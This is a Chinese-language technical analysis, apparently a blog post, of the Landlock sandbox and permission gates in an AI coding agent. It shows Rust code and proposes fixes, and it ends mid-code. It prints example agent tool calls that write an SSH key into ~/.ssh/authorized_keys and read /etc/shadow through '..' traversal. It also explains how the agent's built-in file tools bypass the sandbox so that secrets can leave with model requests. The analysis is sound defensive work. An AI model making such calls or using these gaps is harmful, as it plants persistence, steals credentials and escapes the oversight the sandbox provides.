<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">abi</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">abi</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">8</span><span class="w"> </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>


三个 <code>u64</code> 分别是 <code>handled_access_fs</code>、<code>handled_access_net</code>（ABI 4 加）、<code>scoped</code>（ABI 6 加）。内核的约定是「结构体可以比你认识的小」——传小一点是合法的，多出来的字段会被当成 0。所以这个「按版本给最小够用大小」的写法是向前兼容的，而不是取巧。

这套 ABI 处理有一个隐含假设：<strong>常量表要和内核版本同步维护</strong>。ABI 6 之后如果有 ABI 7 加了新的权限位，<code>ALL_FS</code> 里没有它，沙箱就管不到那个维度——而代码不会报错，因为「没声明处理这个维度」在内核看来是合法的（不处理 = 不限制）。这是 Landlock 的语义特点：<strong>你声明处理哪些维度，就只限制那些维度；没声明的完全放行</strong>。所以漏一个位不会失败，只会静默地少保护一层。
<h2>只读根加工作区可写：两条路径规则</h2>

规则集装好之后，加几条路径规则就决定了最终权限。实现里最多两条：
<div class="codehilite"><pre><span></span><code><span class="c1">// 3. 全盘可读可执行，写权限默认拒绝</span>
<span class="n">add_path_rule</span><span class="p">(</span><span class="n">rs_fd</span><span class="p">,</span><span class="w"> </span><span class="n">root</span><span class="p">,</span><span class="w"> </span><span class="n">READ_EXEC</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
<span class="c1">// 4. 工作区内完全放开（仅 workspace-write）</span>
<span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">ws</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ws</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">add_path_rule</span><span class="p">(</span><span class="n">rs_fd</span><span class="p">,</span><span class="w"> </span><span class="n">ws</span><span class="p">,</span><span class="w"> </span><span class="n">handled</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>


<code>READ_EXEC</code> 是 <code>FS_EXECUTE | FS_READ_FILE | FS_READ_DIR</code>——只有读和执行，没有任何写。因为 <code>handled</code> 里包含了所有写权限位，而根路径只授予了读和执行，所以<strong>未声明的写权限默认拒绝</strong>。这就是「默认拒绝、显式授予」的白名单模型。

第二种模式 <code>ReadOnly</code> 不加第二条规则，于是全盘只有读和执行，工作区也不例外。<code>WorkspaceWrite</code> 加第二条，工作区拿到全部权限（包括 <code>FS_MAKE_CHAR</code>、<code>FS_MAKE_SOCK</code> 等）。

这里有一个容易被忽略的后果：<strong><code>READ_EXEC</code> 覆盖整个 <code>/</code>，所以沙箱里的命令能读任何文件</strong>——包括 <code>~/.ssh/id_rsa</code>、<code>~/.aws/credentials</code>、<code>.env</code>、以及别的项目的源码。沙箱只限制「写」，不限制「读」。

为什么这样设计？因为限制读会让绝大多数命令直接失效：<code>sh</code> 要读 <code>/bin/sh</code> 的依赖库，<code>cargo</code> 要读 <code>~/.cargo</code>，<code>git</code> 要读全局配置。要把读也限制住，需要把每条路径都列出来——那是一份很长、很容易漏、且随系统变化的清单。

但「能读全盘」意味着<strong>数据外泄是一个真实风险</strong>：<code>cat ~/.ssh/id_rsa</code> 是只读命令，免问；结果会作为工具输出回到模型，再随下一次请求发到模型服务商。沙箱对此毫无作用，因为它不限制读，也不限制网络。
<h2>网络没有被限制</h2>

Landlock 从 ABI 4 开始支持网络限制（TCP bind/connect），但这份实现把网络权限位传了 0：
<div class="codehilite"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RulesetAttr</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">handled_access_fs</span><span class="p">:</span><span class="w"> </span><span class="nc">handled</span><span class="p">,</span>
<span class="w">    </span><span class="n">handled_access_net</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
<span class="w">    </span><span class="n">scoped</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
<span class="p">};</span>
</code></pre></div>


<code>handled_access_net = 0</code> 的语义是「我不处理网络维度」，也就是<strong>网络完全不受限</strong>。所以沙箱里的命令可以：
<ul>
<li>连任意 IP 和端口</li>
<li><code>curl</code> 上传文件到外部</li>
<li>建立反向 shell</li>
<li>访问云元数据服务（<code>169.254.169.254</code>）</li>
</ul>

对一个「只限制文件写入」的沙箱，这是合理的分层：它解决的是「别把我的磁盘改坏」，不是「别把我的数据传出去」。但如果目标是「让 Agent 跑不可信代码」，网络就是一个必须处理的维度，而当前实现完全敞开着。

补上的成本不高（ABI 4+）：
<div class="codehilite"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RulesetAttr</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">handled_access_fs</span><span class="p">:</span><span class="w"> </span><span class="nc">handled</span><span class="p">,</span>
<span class="w">    </span><span class="c1">// 处理 TCP bind/connect，但不授予任何端口</span>
<span class="w">    </span><span class="n">handled_access_net</span><span class="p">:</span><span class="w"> </span><span class="nc">NET_BIND_TCP</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">NET_CONNECT_TCP</span><span class="p">,</span>
<span class="w">    </span><span class="n">scoped</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
<span class="p">};</span>
<span class="c1">// 不给任何 net 规则 = 全部拒绝</span>
</code></pre></div>


代价是所有需要网络的命令都会失败。所以这应该是第三种模式（比如 <code>workspace-write-nonet</code>），而不是改现有模式。这也说明「沙箱模式」这个枚举的维度其实不止一个：filesystem、network、process（pid）、IPC——每加一个维度，组合数就翻倍。
<h2>失败即拒绝：为什么不肯降级</h2>

沙箱实现里最重要的一条策略在 <code>attach</code> 里：
<div class="codehilite"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="n">abi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">landlock_abi</span><span class="p">().</span><span class="n">ok_or_else</span><span class="p">(</span><span class="o">||</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="s">&quot;this kernel does not expose Landlock (Linux &gt;= 5.13 required); \</span>
<span class="s">     refusing to run unsandboxed&quot;</span>
<span class="w">        </span><span class="p">.</span><span class="n">to_string</span><span class="p">()</span>
<span class="p">})</span><span class="o">?</span><span class="p">;</span>
</code></pre></div>


内核不支持时，不是「降级成不沙箱」，而是<strong>返回错误、命令不执行</strong>。非 Linux 平台同理：
<div class="codehilite"><pre><span></span><code><span class="nb">Err</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span>
<span class="w">    </span><span class="s">&quot;sandbox mode {mode:?} requires Linux with Landlock support; refusing to run unsandboxed&quot;</span>
<span class="p">))</span>
</code></pre></div>


这个选择的意义在于：沙箱的承诺是「写入不会超出工作区」。如果内核不支持就静默降级，这个承诺就变成了「通常不会超出工作区」——而用户以为它是绝对的。<strong>安全机制最危险的失效方式是静默失效</strong>，因为它不改变用户的行为，只改变实际保护级别。

fail closed 的代价也很直接：在 macOS 和 Windows 上开沙箱，所有命令都会报错。所以启动时有一个提前警告：
<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="n">cfg</span><span class="p">.</span><span class="n">sandbox</span><span class="p">.</span><span class="n">is_active</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">sandbox</span><span class="p">::</span><span class="n">is_supported</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="fm">eprintln!</span><span class="p">(</span>
<span class="w">        </span><span class="s">&quot;warning: sandbox {:?} requested but this kernel does not expose Landlock; ...&quot;</span>
<span class="w">    </span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>


这个警告是必要的，但它只打印一次，而且不阻止启动。更好的做法是：在 <code>goal</code> 模式 + 沙箱开启 + 平台不支持的组合下，直接拒绝启动——因为那个组合意味着「无人监督 + 每条命令都会失败」，跑下去只会浪费 token。
<h2>沙箱只覆盖子进程：最大的缺口</h2>

到这里，五道闸门都讲完了。现在看它们拼起来的实际覆盖面——这是本文最重要的一个表：
<div class="table-scroll"><table>
<thead>
<tr>
<th>工具</th>
<th>check_tool</th>
<th>钩子</th>
<th>审批</th>
<th>Landlock</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>read_file</code></td>
<td>是</td>
<td>是</td>
<td>否</td>
<td><strong>否</strong></td>
</tr>
<tr>
<td><code>write_file</code></td>
<td>是</td>
<td>是</td>
<td>否</td>
<td><strong>否</strong></td>
</tr>
<tr>
<td><code>edit_file</code></td>
<td>是</td>
<td>是</td>
<td>否</td>
<td><strong>否</strong></td>
</tr>
<tr>
<td><code>apply_patch</code></td>
<td>是</td>
<td>是</td>
<td>否</td>
<td><strong>否</strong></td>
</tr>
<tr>
<td><code>run_command</code>（前台）</td>
<td>是</td>
<td>是</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td><code>run_command</code>（后台）</td>
<td>是</td>
<td>是</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td><code>git_commit</code></td>
<td>是</td>
<td>是</td>
<td>是</td>
<td><strong>否</strong></td>
</tr>
<tr>
<td><code>web_fetch</code></td>
<td>是</td>
<td>是</td>
<td>否</td>
<td>否（进程内 HTTP）</td>
</tr>
</tbody>
</table></div>

内置文件工具只受前两道管。它们不 spawn 子进程，所以 Landlock 完全够不着——沙箱是装在<strong>子进程</strong>上的，而 <code>write_file</code> 跑在 agent 自己的进程里。

这意味着 <code>sandbox: workspace-write</code> 的实际语义是「<strong>子进程</strong>不能写到工作区外」，而不是「这个 agent 不能写到工作区外」。agent 自己可以用一条 <code>write_file</code> 写到任何地方：
<div class="codehilite"><pre><span></span><code>write_file(path=&quot;/home/user/.ssh/authorized_keys&quot;, content=&quot;ssh-rsa AAAA...&quot;)
</code></pre></div>


这条调用通过 <code>check_tool</code>（<code>write_file</code> 不在任何封禁列表里，<code>default</code> 模式下允许），不触发钩子（除非用户配了），不需要审批（审批只在 shell 里），不受沙箱限制（没有子进程）。四道闸门全部不适用。

<code>read_file</code> 同理，而且后果更直接：读 <code>~/.ssh/id_rsa</code> 的内容会作为工具结果回到模型上下文，然后随下一次 API 请求发出去。这是一条完整的「本地文件 → 远端服务」通道，不需要网络权限，因为<strong>Agent 的模型调用本来就是出网的</strong>。

修复这个东西不能靠「再加一道闸门」，因为缺的不是闸门，是<strong>内置工具没有沙箱</strong>。正确的修法有两个方向：

<strong>方向一：给内置文件工具加路径检查。</strong> 在 <code>resolve()</code> 之后加一个「必须在 root 内」的判定（下一节详述）。这是最小改动，也是最直接的修复。缺点是它只覆盖路径类工具，<code>web_fetch</code> 之类的仍然另说。

<strong>方向二：让内置工具走沙箱。</strong> 这不可行——Landlock 是进程级的、不可撤销的，一旦装上，agent 自己就读不到 <code>~/.nanohermes/config.json</code> 和系统 prompt 了。

所以方向一是唯一选择。而它的正确实现需要解决三件事：规范化（<code>..</code> 和绝对路径）、符号链接、以及「哪些路径算例外」（比如 <code>~/.nanohermes/</code> 下的会话文件必须可读写）。
<h2>resolve 不做规范化：绝对路径与 .. 直通</h2>

当前实现只有四行：
<div class="codehilite"><pre><span></span><code><span class="k">pub</span><span class="w"> </span><span class="k">fn</span><span class="w"> </span><span class="nf">resolve</span><span class="p">(</span><span class="n">root</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="nc">Path</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="nc">PathBuf</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Path</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">path</span><span class="p">.</span><span class="n">is_absolute</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">path</span><span class="p">.</span><span class="n">to_path_buf</span><span class="p">()</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">root</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>


两个分支都<strong>不做任何规范化</strong>：
<ul>
<li>绝对路径原样返回，<code>/etc/passwd</code> 就是 <code>/etc/passwd</code></li>
<li>相对路径只是 <code>join</code>，<code>../../etc/passwd</code> 会变成 <code>&lt;root&gt;/../../etc/passwd</code></li>
</ul>

后者在文件系统层面等价于 <code>/etc/passwd</code>（取决于 root 的深度），所以 <code>..</code> 也能逃出去。这不是一个「理论漏洞」，它的利用难度和写 <code>/etc/passwd</code> 完全一样：
<div class="codehilite"><pre><span></span><code>read_file(path=&quot;../../../../etc/shadow&quot;)
</code></pre></div>


<code>Path::is_absolute()</code> 对这个字符串返回 false，于是走 <code>join</code>，得到一个含 <code>..</code> 的路径，<code>fs::read</code> 会正常解析它。

修法是加一个「词法规范化 + 前缀检查」。注意不能只用 <code>canonicalize()</code>——它会解析符号链接，而且要求路径存在（新建文件时不存在）。正确的顺序是：
<div class="codehilite"><pre><span></span><code><span class="k">fn</span><span class="w"> </span><span class="nf">resolve_checked</span><span class="p">(</span><span class="n">root</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="nc">Path</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="nb">Result</span><span class="o">&lt;</span><span class="n">PathBuf</span><span class="p">,</span><span class="w"> </span><span class="nb">String</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">joined</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">Path</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="n">p</span><span class="p">).</span><span class="n">is_absolute</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">PathBuf</span><span class="p">::</span><span class="n">from</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">root</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="w">    </span><span class="p">};</span>
<span class="w">    </span><span class="c1">// 1. 词法规范化：消掉 . 和 ..</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PathBuf</span><span class="p">::</span><span class="n">new</span><span class="p">();</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">comp</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">joined</span><span class="p">.</span><span class="n">components</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">match</span><span class="w"> </span><span class="n">comp</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">Component</span><span class="p">::</span><span class="n">ParentDir</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">out</span><span class="p">.</span><span class="n">pop</span><span class="p">();</span><span class="w"> </span><span class="p">}</span>
<span class="w">            </span><span class="n">Component</span><span class="p">::</span><span class="n">CurDir</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{}</span>
<span class="w">            </span><span class="n">other</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">out</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">other</span><span class="p">),</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="c1">// 2. 前缀检查（词法层面）</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">!</span><span class="n">out</span><span class="p">.</span><span class="n">starts_with</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;path {} escapes the workspace&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">out</span><span class="p">.</span><span class="n">display</span><span class="p">()));</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="c1">// 3. 若已存在，再按 canonical 结果复查一次（防符号链接）</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(</span><span class="n">real</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">out</span><span class="p">.</span><span class="n">canonicalize</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">root_real</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">canonicalize</span><span class="p">().</span><span class="n">unwrap_or_else</span><span class="p">(</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">to_path_buf</span><span class="p">());</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">!</span><span class="n">real</span><span class="p">.</span><span class="n">starts_with</span><span class="p">(</span><span class="o">&amp;</span><span class="n">root_real</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
